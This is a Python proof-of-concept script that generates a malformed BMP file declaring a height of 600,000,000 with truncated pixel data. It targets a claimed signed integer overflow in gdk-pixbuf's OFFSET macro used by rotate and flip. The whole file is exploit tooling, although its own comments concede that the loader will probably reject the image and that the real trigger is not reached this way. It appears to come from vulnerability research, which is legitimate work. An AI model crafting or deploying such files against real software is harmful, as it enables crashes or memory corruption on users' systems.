#!/usr/bin/env python3
"""
vuln_001_gen.py - Generate a BMP file crafted to trigger VULN-001
(OFFSET macro signed integer overflow in gdk-pixbuf-scale.c line 399)

Vulnerability: gdk_pixbuf_rotate_simple() / gdk_pixbuf_flip() use the macro:
    #define OFFSET(pb, x, y) ((x)*n_channels + (y)*rowstride)
With large height (e.g., 600000000) and RGBA (rowstride=4), the computation
(height-1)*rowstride overflows a signed 32-bit integer, yielding a negative
offset -> heap OOB read/write.

This script generates a BMP claiming width=1, height=600000000, 32bpp.
The pixel data is intentionally truncated (only a few bytes) so the file
is small. Whether the loader accepts or rejects it depends on how gdk-pixbuf
validates dimensions before allocating memory.

NOTE: Actually allocating 1 * 600000000 * 4 = ~2.4 GB of pixel data is
infeasible for a PoC file; we truncate the pixel data. The loader will likely
reject the image due to missing data or refuse to allocate 2.4 GB.
The real trigger requires calling gdk_pixbuf_rotate_simple() or
gdk_pixbuf_flip() on a successfully loaded large pixbuf, which cannot
be done via gdk-pixbuf-pixdata.
"""

import struct
import os
import sys

OUTPUT_FILE = "trigger.bmp"

WIDTH = 1
HEIGHT = 600000000   # large enough so (HEIGHT-1)*4 > INT_MAX (2147483647)
BITS_PER_PIXEL = 32  # RGBA / BGRA -> 4 channels

# BMP pixel data offset (after both headers)
PIXEL_OFFSET = 54

# For a compliant BMP, imageSize would be WIDTH * HEIGHT * 4 bytes (~2.4 GB).
# We lie in the header and only write a handful of bytes of pixel data so the
# file stays small. The loader will either reject it (short read) or crash
# attempting to process the claimed dimensions.
IMAGE_SIZE_CLAIMED = WIDTH * HEIGHT * 4   # claimed, not actual written bytes
# Clamp to 32-bit for the header field (will overflow, but that's the point)
IMAGE_SIZE_HEADER = IMAGE_SIZE_CLAIMED & 0xFFFFFFFF

# File size: headers + a few dummy pixels
DUMMY_PIXEL_BYTES = 16  # minimal pixel data (4 pixels worth)
FILE_SIZE = PIXEL_OFFSET + DUMMY_PIXEL_BYTES

# --- BITMAPFILEHEADER (14 bytes) ---
bfType      = b'BM'
bfSize      = struct.pack('<I', FILE_SIZE)
bfReserved  = struct.pack('<I', 0)
bfOffBits   = struct.pack('<I', PIXEL_OFFSET)

# --- BITMAPINFOHEADER (40 bytes) ---
biSize          = struct.pack('<I', 40)
biWidth         = struct.pack('<i', WIDTH)
biHeight        = struct.pack('<i', HEIGHT)   # positive = bottom-up
biPlanes        = struct.pack('<H', 1)
biBitCount      = struct.pack('<H', BITS_PER_PIXEL)
biCompression   = struct.pack('<I', 0)        # BI_RGB
biSizeImage     = struct.pack('<I', IMAGE_SIZE_HEADER)
biXPelsPerMeter = struct.pack('<i', 0)
biYPelsPerMeter = struct.pack('<i', 0)
biClrUsed       = struct.pack('<I', 0)
biClrImportant  = struct.pack('<I', 0)

file_header = bfType + bfSize + bfReserved + bfOffBits
info_header = (biSize + biWidth + biHeight + biPlanes + biBitCount +
               biCompression + biSizeImage + biXPelsPerMeter +
               biYPelsPerMeter + biClrUsed + biClrImportant)

assert len(file_header) == 14, f"File header size mismatch: {len(file_header)}"
assert len(info_header) == 40, f"Info header size mismatch: {len(info_header)}"

# Minimal pixel data (truncated, will not represent all HEIGHT rows)
pixel_data = b'\x00\x00\x00\xff' * (DUMMY_PIXEL_BYTES // 4)  # BGRA black pixels

bmp_data = file_header + info_header + pixel_data

output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), OUTPUT_FILE)
with open(output_path, 'wb') as f:
    f.write(bmp_data)

print(f"[*] Written {len(bmp_data)} bytes to: {output_path}")
print(f"[*] BMP claims: width={WIDTH}, height={HEIGHT}, bpp={BITS_PER_PIXEL}")
print(f"[*] Claimed image size: {IMAGE_SIZE_CLAIMED} bytes ({IMAGE_SIZE_CLAIMED/1e9:.2f} GB)")
print(f"[*] Actual pixel bytes written: {DUMMY_PIXEL_BYTES} (truncated)")
print(f"[*] Overflow check: (HEIGHT-1)*4 = {(HEIGHT-1)*4} vs INT_MAX = {2**31-1}")
print(f"[*]   Overflow occurs: {(HEIGHT-1)*4 > 2**31-1}")
